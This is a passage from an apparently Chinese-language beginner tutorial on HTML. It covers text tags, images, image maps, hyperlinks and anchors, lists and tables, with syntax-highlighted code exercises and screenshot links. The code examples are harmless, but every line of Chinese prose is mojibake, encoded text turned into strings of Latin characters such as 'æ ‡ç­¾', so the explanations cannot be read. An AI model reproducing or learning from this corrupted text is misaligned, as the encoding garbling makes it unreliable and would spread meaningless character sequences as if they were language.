‘æ—å˜æˆäº†æé»„è‰²è¿œè¿œæœ›å»ï¼Œå°±åƒæå¤´æŒ‚æ»¡äº†ç†Ÿé€çš„æå’Œæ¢¨ï¼›æœ‰çš„æ ‘æ—å˜æˆäº†ç«çº¢è‰²ï¼Œé£ä¸€å¹ï¼Œæ ‘æ—è·³èµ·èˆæ¥ï¼Œå°±åƒä¸€ç°‡ç°‡ç«è‹—åœ¨è·³è·ƒï¼›è¿˜æœ‰çš„æ ‘æ—å˜å¾—ç´«çº¢ç´«çº¢ï¼Œè·Ÿå‰§åœºé‡Œçš„ç´«ç»’å¹•å¸ƒçš„é¢œè‰²ä¸€æ ·ã€‚åªæœ‰æ¾æŸä¸æ€•ç§‹éœœï¼Œé’ˆä¸€æ ·çš„å¶å­è¿˜æ˜¯é‚£ä¹ˆç¿ ç»¿ã€‚<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>ç§‹å¤©çš„å±±ä¸€ç‰‡é‡‘é»„ï¼Œä¸€ç‰‡ç«çº¢ï¼Œä¸€ç‰‡ç¿ ç»¿â€¦â€¦äººä»¬ç»™è¿™äº”é¢œå…­è‰²çš„å±±èµ·äº†ä¸ªå¥½å¬çš„åå­—ï¼Œå«â€œ<span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">del</span>&gt;</span>äº”èŠ±å±±<span class="hljs-tag">&lt;/<span class="hljs-name">del</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span>â€ã€‚<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>  <span class="hljs-comment">&lt;!-- å‡ ä¸ªæ ‡ç­¾çš„åµŒå¥— --&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>åŠ ç²—<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>æ–œä½“<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">del</span>&gt;</span>åˆ é™¤æ–‡å­—<span class="hljs-tag">&lt;/<span class="hljs-name">del</span>&gt;</span><span class="hljs-comment">&lt;!-- &lt;span&gt;é…åˆcss&lt;/span&gt; --&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><p>æ•ˆæœï¼š</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/wenben.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML-å›¾åƒ"><a href="#HTML-å›¾åƒ" class="headerlink" title="HTML å›¾åƒ"></a>HTML å›¾åƒ</h2><p> ==<strong>HTML å›¾åƒ-</strong>== ï¼š</p><ol><li>æ ‡ç­¾ï¼ˆ <code>&lt;img&gt;</code>ï¼‰æ˜¯ç©ºæ ‡ç­¾ï¼Œæ„æ€æ˜¯è¯´ï¼Œå®ƒåªåŒ…å«å±æ€§ï¼Œå¹¶ä¸”æ²¡æœ‰é—­åˆæ ‡ç­¾ã€‚</li><li>æºå±æ€§ï¼ˆ<code>&lt;src&gt;</code>ï¼‰æ˜¯å›¾åƒçš„ URL åœ°å€ã€‚åˆ†ä¸ºæœ¬åœ°å’Œç½‘ä¸Šï¼Œæœ¬åœ°å›¾ç‰‡å†™è·¯å¾„çš„æ—¶å€™æ³¨æ„<strong>ç»å¯¹è·¯å¾„å’Œç›¸å¯¹è·¯å¾„</strong>ï¼ˆå¯ä»¥ç”¨<code>../</code>æ¥è¿”å› ä¸€çº§ç›®å½•ï¼Œè¿”å›å‡ çº§ç›®å½•å°±å†™å‡ ä¸ªå®ƒå°±è¡Œ)ã€‚</li><li>Altå±æ€§:alt å±æ€§ç”¨æ¥ä¸ºå›¾åƒå®šä¹‰ä¸€ä¸²é¢„å¤‡çš„å¯æ›¿æ¢çš„æ–‡æœ¬,åœ¨æµè§ˆå™¨æ— æ³•è½½å…¥å›¾åƒæ—¶,å‘Šç”¨æˆ·å›¾ç‰‡çš„ä¿¡æ¯ã€‚<strong>==æœç´¢å¼•æ“ä¹Ÿæ˜¯é€šè¿‡æ­¤æè¿°æ¥æ”¶é›†å›¾ç‰‡çš„==</strong>.</li><li>é«˜åº¦ä¸å®½åº¦:heightï¼ˆé«˜åº¦ï¼‰ ä¸ widthï¼ˆå®½åº¦ï¼‰å±æ€§ç”¨äºè®¾ç½®å›¾åƒçš„é«˜åº¦ä¸å®½åº¦ã€‚å±æ€§å€¼é»˜è®¤å•ä½ä¸ºåƒç´ pxã€‚</li></ol><p>ç»ƒä¹ ï¼š</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>å›¾ç‰‡<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"1.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"chumençš„qqå›¾åƒ"</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"chumençš„qqå›¾åƒ"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><h4 id="å›¾ç‰‡çš„æ˜ å°„"><a href="#å›¾ç‰‡çš„æ˜ å°„" class="headerlink" title="å›¾ç‰‡çš„æ˜ å°„"></a>å›¾ç‰‡çš„æ˜ å°„</h4><p>ç›®æ ‡æ˜¯ä¸ºäº†åœ¨ä¸€å¼ å›¾ç‰‡ä¸Šçš„<strong>æŸä¸ªä½ç½®</strong>ç‚¹å‡»å<strong>æ‰</strong>å¯ä»¥å®ç°æŸä¸ªåŠŸèƒ½ã€‚</p><p>è¿™éœ€è¦ç”¨åˆ°<code>usemap=&quot;#diyname&quot;</code> ç„¶åç”¨<code>&lt;map name=&quot;diyname&quot;&gt;&lt;/map&gt;</code>æ ‡ç­¾æ¥å¯¹åº”ã€‚</p><p>æ ¸å¿ƒä»£ç ï¼š`<map name="1map"></map></p><div class="hljs"><pre><code class="hljs undefined">&lt;area <span class="hljs-attribute">shape</span>=<span class="hljs-string">""</span> <span class="hljs-attribute">coords</span>=<span class="hljs-string">""</span> <span class="hljs-attribute">href</span>=<span class="hljs-string">""</span>&gt;</code></pre></div><p>\\`</p><p>shapeæ˜¯é€‰æ‹©çš„å½¢çŠ¶ï¼Œcoordsæ˜¯åæ ‡ï¼Œåæ ‡ç¡®å®š<strong>æ¨èç”¨qqçš„æˆªå›¾åŠŸèƒ½é‚£é‡Œæ¥ç¡®å®š</strong>ï¼Œæ¯”å¦‚ï¼š</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/quzuobiao.jpg?raw=true" srcset="/img/loading.gif" alt></p><p>é‚£è¿™ä¸ªå½©è‰²ç®­å¤´æŒ‡çš„ä½ç½®å°±æ˜¯åœ¨è¿™ä¸ªå›¾åƒçš„ï¼ˆ233,456ï¼‰ä½ç½®ã€‚</p><p><strong>ç»ƒä¹ ï¼š</strong></p><div class="hljs"><pre><code class="hljs HTML"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>å›¾ç‰‡çš„æ˜ å°„<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"1.png"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span> <span class="hljs-attr">usemap</span>=<span class="hljs-string">"#1map"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">map</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"1map"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">area</span> <span class="hljs-attr">shape</span>=<span class="hljs-string">"circle"</span> <span class="hljs-attr">coords</span>=<span class="hljs-string">"300,255,50"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://www.baidu.com"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><p><strong>æ•ˆæœ</strong>ï¼š<img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/yingshe.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML-è¶…é“¾æ¥"><a href="#HTML-è¶…é“¾æ¥" class="headerlink" title="HTML è¶…é“¾æ¥"></a>HTML è¶…é“¾æ¥</h2><p>è¶…é“¾æ¥å¯ä»¥æ˜¯ä¸€ä¸ªå­—ï¼Œä¸€ä¸ªè¯ï¼Œæˆ–è€…ä¸€ç»„è¯ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€å¹…å›¾åƒï¼Œæ‚¨å¯ä»¥ç‚¹å‡»è¿™äº›å†…å®¹æ¥è·³è½¬åˆ°æ–°çš„æ–‡æ¡£æˆ–è€…å½“å‰æ–‡æ¡£ä¸­çš„æŸä¸ªéƒ¨åˆ†ã€‚ä½¿ç”¨æ ‡ç­¾ <code>&lt;a&gt;</code>æ¥è®¾ç½®è¶…æ–‡æœ¬é“¾æ¥ã€‚</p><ul><li><p><strong>HTML é“¾æ¥è¯­æ³•</strong>:<code>&lt;a href=&quot;url&quot;&gt;é“¾æ¥æ–‡æœ¬&lt;/a&gt;</code>  ,href å±æ€§æè¿°äº†é“¾æ¥çš„ç›®æ ‡ã€‚</p></li><li><p><strong>target å±æ€§</strong>  :<code>target=&quot;_blank&quot;</code>æ•ˆæœå°±æ˜¯åœ¨æ–°çª—å£ï¼ˆç©ºç™½ç•Œé¢ï¼‰åšå‡ºæ¥ ã€‚</p></li><li><p><strong>id å±æ€§</strong>:idå±æ€§å¯ç”¨äºåˆ›å»ºåœ¨ä¸€ä¸ªHTMLæ–‡æ¡£ä¹¦ç­¾æ ‡è®°,åœ¨HTMLæ–‡æ¡£ä¸­æ’å…¥ID:</p><p><code>&lt;a id=&quot;tips&quot;&gt;æœ‰ç”¨çš„æç¤ºéƒ¨åˆ†&lt;/a&gt;</code> </p><p>åœ¨HTMLæ–‡æ¡£ä¸­åˆ›å»ºä¸€ä¸ªé“¾æ¥åˆ°â€æœ‰ç”¨çš„æç¤ºéƒ¨åˆ†(id=â€tipsâ€ï¼‰â€:</p><p><code>&lt;a href=&quot;#tips&quot;&gt;è®¿é—®æœ‰ç”¨çš„æç¤ºéƒ¨åˆ†&lt;/a&gt;</code></p></li></ul><p><strong>è§£é‡ŠåŠ è¡¥å……</strong>ï¼šID å±æ€§åå­—åªèƒ½æœ‰ä¸€ä¸ªä¸å¯é‡å¤ï¼Œä¸”å¿…é¡»ä»¥==å­—æ¯==å¼€å¤´ï¼Œå¯ä»¥åœ¨ä¸€ä¸ªç•Œé¢çš„ä»»ä½•ä½ç½®çš„å†…å®¹è¿›è¡Œè®¾ç½®IDï¼Œåœ¨è®¾ç½®å®Œåï¼Œï¼ˆ<code>&lt;a href=&quot;# &quot;&gt;</code>ï¼‰ï¼Œåœ¨==â€œ#â€==ååŠ å…¥idçš„åç§°å³å¯è·³è½¬åˆ°ä½ è®¾ç½®IDçš„å†…å®¹å¤„ã€‚</p><p><code>&lt;a name=&quot;end&quot;&gt;&lt;/a&gt;</code> <code>&lt;a href=&quot;#end&quot;&gt;end&lt;/a&gt;</code>    <strong>åšé”šç‚¹æ—¶ï¼Œæ›¿æ¢idçš„æ–¹æ³•ï¼Œä½œç”¨å¯ä»¥å®ç°ä¸€æ ·ï¼idä¸å¥½ç”¨æ—¶ç”¨è¿™ä¸ª</strong></p><p><strong>ç»ƒä¹ ï¼š</strong>ï¼ˆä¸ºäº†æ–¹ä¾¿é˜…è¯»ï¼Œçœç•¥äº†å¾ˆå¤šçš„<code>&lt;br&gt;</code>.ï¼‰</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>è¶…çº§é“¾æ¥<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://www.mi.com"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"1.png"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>    <span class="hljs-comment">&lt;!-- /*ä¹¦ç­¾æ ‡è®°ï¼šé”šç‚¹*/ --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#end"</span>&gt;</span>end<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"aa"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"miao"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"miao"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"end"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#miao"</span>&gt;</span>miao<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><h2 id="HTML-åˆ—è¡¨"><a href="#HTML-åˆ—è¡¨" class="headerlink" title="HTML åˆ—è¡¨"></a>HTML åˆ—è¡¨</h2><ul><li><strong>HTMLæ— åºåˆ—è¡¨</strong>ï¼š<code>&lt;ul&gt;</code>ä¸ <code>&lt;li&gt;</code>å…¶ç‚¹çš„æ ·å¼(åœ†åœˆï¼Œåœ†å¿ƒï¼Œæ­£æ–¹å½¢ï¼‰ç”¨<strong>css</strong>æ¥æ§åˆ¶<code>&lt;ul style=&quot;list-style-type:circle&quot;&gt;</code></li><li><strong>HTML æœ‰åºåˆ—è¡¨</strong> <code>&lt;ol&gt;</code>ä¸<code>&lt;li&gt;</code>   ç”¨æ³•å’Œæ— åºç›¸ä¼¼ï¼Œ<strong>ä¸”æœ‰åºä¸æ— åºä¹‹é—´å¯ä»¥äº’ç›¸åµŒå¥—</strong>ï¼Œ<strong>åµŒå¥—è¿‡ç¨‹ä¸­ç‚¹çš„å½¢çŠ¶ä¹Ÿä¼šè‡ªåŠ¨å˜åŒ–ã€‚</strong></li><li><strong>HTML è‡ªå®šä¹‰åˆ—è¡¨</strong>ï¼šè¿™ä¸ªæ˜¯æ¯”è¾ƒå¸¸ç”¨çš„ï¼Œè‡ªå®šä¹‰åˆ—è¡¨ä»¥<code>&lt;dl&gt;</code> æ ‡ç­¾å¼€å§‹ã€‚æ¯ä¸ªè‡ªå®šä¹‰åˆ—è¡¨é¡¹ä»¥ <code>&lt;dt&gt;</code> å¼€å§‹ã€‚æ¯ä¸ªè‡ªå®šä¹‰åˆ—è¡¨é¡¹çš„å®šä¹‰ä»¥ <code>&lt;dd&gt;</code>å¼€å§‹ã€‚å…¶<strong>ä¸ä»…ä»…æ˜¯ä¸€åˆ—é¡¹ç›®ï¼Œè€Œæ˜¯é¡¹ç›®åŠå…¶æ³¨é‡Šçš„ç»„åˆã€‚</strong></li></ul><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>Coffee<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span>    <span class="hljs-comment">&lt;!-- åˆ—è¡¨æ ‡é¢˜ --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>- black hot drink<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span>   <span class="hljs-comment">&lt;!-- å…¶å†…å®¹ --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>Milk<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>- white cold drink<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span></code></pre></div><p><strong>ç»ƒä¹ ï¼š</strong></p><div class="hljs"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>åˆ—è¡¨<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"list-style-type:circle"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>æ— åºåˆ—è¡¨1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>æ— åºåˆ—è¡¨2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>æ— åºåˆ—è¡¨3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>æ— åºåˆ—è¡¨4<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>æœ‰åºåˆ—è¡¨1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>æœ‰åºåˆ—è¡¨2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>æœ‰åºåˆ—è¡¨3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>æœ‰åºåˆ—è¡¨4<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>æ ‡é¢˜1<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>è‡ªå®šä¹‰åˆ—è¡¨1<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>è‡ªå®šä¹‰åˆ—è¡¨2<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>è‡ªå®šä¹‰åˆ—è¡¨3<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>è‡ªå®šä¹‰åˆ—è¡¨4<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>æ ‡é¢˜2<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>è‡ªå®šä¹‰åˆ—è¡¨1<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>è‡ªå®šä¹‰åˆ—è¡¨2<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>è‡ªå®šä¹‰åˆ—è¡¨3<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>è‡ªå®šä¹‰åˆ—è¡¨4<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><p>æ•ˆæœï¼š</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/liebiao.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTMLè¡¨æ ¼"><a href="#HTMLè¡¨æ ¼" class="headerlink" title="HTMLè¡¨æ ¼"></a>HTMLè¡¨æ ¼</h2><ul><li><p><strong>HTML è¡¨æ ¼</strong>ï¼šè¡¨æ ¼ç”± <code>&lt;table&gt;</code>æ ‡ç­¾æ¥å®šä¹‰ã€‚æ¯ä¸ªè¡¨æ ¼å‡æœ‰è‹¥å¹²==è¡Œ==ï¼ˆç”± <code>&lt;tr&gt;</code> æ ‡ç­¾å®šä¹‰ï¼‰ï¼Œæ¯è¡Œè¢«åˆ†å‰²ä¸ºè‹¥å¹²==å•å…ƒæ ¼==ï¼ˆç”± <code>&lt;td&gt;</code> æ ‡ç­¾å®šä¹‰ï¼‰ã€‚å­—æ¯ td æŒ‡<strong>è¡¨æ ¼æ•°æ®</strong>ï¼ˆtable dataï¼‰ï¼Œå³æ•°<strong>æ®å•å…ƒæ ¼çš„å†…å®¹</strong>ã€‚æ•°æ®å•å…ƒæ ¼å¯ä»¥åŒ…å«<strong>æ–‡æœ¬ã€å›¾ç‰‡ã€åˆ—è¡¨ã€æ®µè½ã€è¡¨å•ã€æ°´å¹³çº¿ã€è¡¨æ ¼</strong>ç­‰ç­‰ã€‚è¿™ä¸ªæœ‰åˆ©äºå¤šæ ·åŒ–ï¼Œåœ¨åˆ†æ¸…æ ç›®ååœ¨tdé‡Œæ”¾å†…å®¹å°±okã€‚</p></li><li><p><strong>HTML è¾¹æ¡†å±æ€§</strong>:<code>&lt;table border=&quot;1&quot;&gt;</code>ä¼šå‡ºç°è¡¨æ¡†ã€‚</p></li><li><p><strong>HTML è¡¨æ ¼è¡¨å¤´</strong>:è¡¨æ ¼çš„è¡¨å¤´ä½¿ç”¨ <code>&lt;th&gt;</code> æ ‡ç­¾è¿›è¡Œå®šä¹‰ã€‚<code>&lt;th&gt;</code>æ ‡ç­¾ä¸<code>&lt;td&gt;</code>æ ‡ç­¾<strong>ç”¨æ³•ç›¸ä¼¼åªæ˜¯æ˜¾ç¤ºçš„æ•ˆæœä¸åŒï¼Œä¼šæœ‰ç²—ä½“å±…ä¸­çš„æ•ˆæœï¼›</strong></p></li><li><p><strong>HTMLè¡¨æ ¼åˆå¹¶</strong>ï¼šç”¨ <strong>colspan</strong>ï¼š æ¨ªå‘è¡Œ  <strong>rowspan</strong>  ï¼šç«–çºµè¡Œã€‚</p></li><li><p><strong>HTMLè¡¨æ ¼å•å…ƒæ ¼è¾¹è·çš„è®¾ç½®</strong>ï¼šç±»ä¼¼ <strong>è®¾ç½®è¾¹æ¡†</strong> ç›´æ¥åœ¨tableæ ‡ç­¾é‡Œæ”¾å…¥<strong>cellpadding=â€œè‡ªå®šä¹‰çš„æ•°å­—â€</strong>ï¼Œå°±è®¾ç½®å¥½äº†ã€‚</p></li></ul><p><strong>ç»ƒä¹ ï¼š</strong></p><div class="hljs"><pre><code class="hljs HTML"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>è¡¨æ ¼<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">"1"</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>éƒ¨é—¨<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>å§“å<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>æ€§åˆ«<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>å·¥èµ„<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">rowspan</span>=<span class="hljs-string">"3"</span>&gt;</span>å¼€å‘ç»„<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>å°æ˜<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>ç”·<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1w<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span 